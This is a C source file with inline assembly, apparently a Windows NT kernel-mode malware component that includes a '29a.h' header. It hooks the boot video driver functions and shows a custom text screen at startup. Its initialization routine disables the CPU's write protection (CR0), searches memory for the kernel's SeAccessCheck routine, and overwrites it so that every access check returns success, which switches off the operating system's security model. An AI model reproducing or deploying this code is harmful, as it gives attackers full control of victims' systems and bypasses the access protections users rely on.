#include <c:\progra~1\ntddk\inc\ddk\ntddk.h>
#include "29a.h"

#define uint unsigned int

char *textmode_mem;
int vid_reset=0;

NTKERNELAPI uint VidBitBlt(uint a, uint b, uint c);
NTKERNELAPI uint VidBufferToScreenBlt(uint a, uint b, uint c, uint d, uint e, uint f);
NTKERNELAPI uint VidCleanUp(void);
NTKERNELAPI uint VidDisplayString(char *str);
NTKERNELAPI uint VidDisplayStringXY(char *str, int x_, int y_, int colour);
NTKERNELAPI uint VidInitialize(uint a);
NTKERNELAPI uint VidResetDisplay(void);
NTKERNELAPI uint VidScreenToBufferBlt(uint a, uint b, uint c, uint d, uint e, uint f);
NTKERNELAPI uint VidSetScrollRegion(uint a, uint b, uint d, uint e);
NTKERNELAPI uint VidSetTextColor(uint a);
NTKERNELAPI uint VidSolidColorFill(uint a, uint b, uint c, uint d, uint e);

void InitTextMode() {
	int x;
	PHYSICAL_ADDRESS video_mem={0xb8000, 0};

	textmode_mem=(char *)MmMapIoSpace(video_mem, 32768, 0);
	for(x=0; x<32768; x++) textmode_mem[x]=x&1?7:' ';
}

__declspec(naked) uint VidBitBlt_(uint a, uint b, uint c) {
	__asm {
		cmp dword ptr [vid_reset], 0
		jz vid_bit_blt_end
		jmp dword ptr [VidBitBlt]
vid_bit_blt_end:
		retn 12	
        }
}

// called every ~50 milisecondz (set by KeSetTimerEx via DPC so 50 milisecondz + time for running a DPC)
__declspec(naked) uint VidBufferToScreenBlt_(uint a, uint b, uint c, uint d, uint e, uint f) {
	__asm retn 24			// jmp dword ptr [VidBufferToScreenBlt]
}

__declspec(naked) uint VidCleanUp_(void) {
	__asm jmp dword ptr [VidCleanUp]
}

__declspec(naked) uint VidDisplayString_(char*str) {
	__asm jmp dword ptr [VidDisplayString]
}

__declspec(naked) uint VidDisplayStringXY_(char *str, int x_, int y_, int colour) {
	__asm jmp dword ptr [VidDisplayStringXY]
}

__declspec(naked) uint VidInitialize_(uint a) {
	InitTextMode();
	memcpy(textmode_mem, data, 80*25*2);

	__asm {
		push eax
		mov eax, cr0
		btr eax, 16
		mov cr0, eax

		pushad

		push 200
		pop ecx

		mov edi, dword ptr [SeAccessCheck]

	        call next
search_start:
		mov al, byte ptr [ebp+14h]
		pop edi
		pop esi
		pop ebx
		pop ebp
		retn 28h
next:
		pop esi
try_next_addr:
		pushad

	        mov ecx, offset next
	        mov edx, offset search_start
	        sub ecx, edx
		repz cmpsb
		popad
		jz got_addr

		inc edi
		loop try_next_addr
		jmp end_search

got_addr:
		call next_
		push 1
		pop eax
next_:
		pop esi
		push 3
		pop ecx

		rep movsb
end_search:
		popad
		mov cr0, eax
		pop eax

                and dword ptr [esp+4], 0
		jmp dword ptr [VidInitialize]
	};
}

__declspec(naked) uint VidResetDisplay_(void) {
	__asm {
		inc dword ptr [vid_reset]
		jmp dword ptr [VidResetDisplay]
         }
}


__declspec(naked) uint VidScreenToBufferBlt_(uint a, uint b, uint c, uint d, uint e, uint f) {
	__asm jmp dword ptr [VidScreenToBufferBlt]
}

__declspec(naked) uint VidSetScrollRegion_(uint a, uint b, uint d, uint e) {
	__asm jmp dword ptr [VidSetScrollRegion]
}

__declspec(naked) uint VidSetTextColor_(uint a) {
	__asm jmp dword ptr [VidSetTextColor]
}

__declspec(naked) uint VidSolidColorFill_(uint a, uint b, uint c, uint d, uint e) {
	__asm jmp dword ptr [VidSolidColorFill]
}
